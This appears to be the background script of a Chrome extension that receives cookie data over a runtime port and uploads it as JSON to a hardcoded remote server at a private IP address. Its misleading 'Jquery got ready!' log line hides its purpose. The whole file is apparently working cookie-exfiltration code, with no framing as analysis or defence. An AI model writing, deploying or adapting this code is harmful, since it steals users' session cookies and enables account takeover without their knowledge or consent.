const host = "http://192.168.50.2:5555/analyser/upload/";
let jq = false;

chrome.runtime.onInstalled.addListener(function() {
    jq = true;
    console.log("Jquery got ready!");
});

chrome.runtime.onConnect.addListener(function(port) {
    port.onMessage.addListener(async function(msg) {
        let cookies = await JSON.stringify(msg, null, 2);
        console.log("Cookies received.");
        upload(cookies);
    })
})

async function upload(content) {
    const res = await fetch(host, {
        method: 'POST',
        body: content,
        headers: {
            'Content-Type': 'application/json'
        }
    });

    const resText = await res.text();
    console.log(resText);
}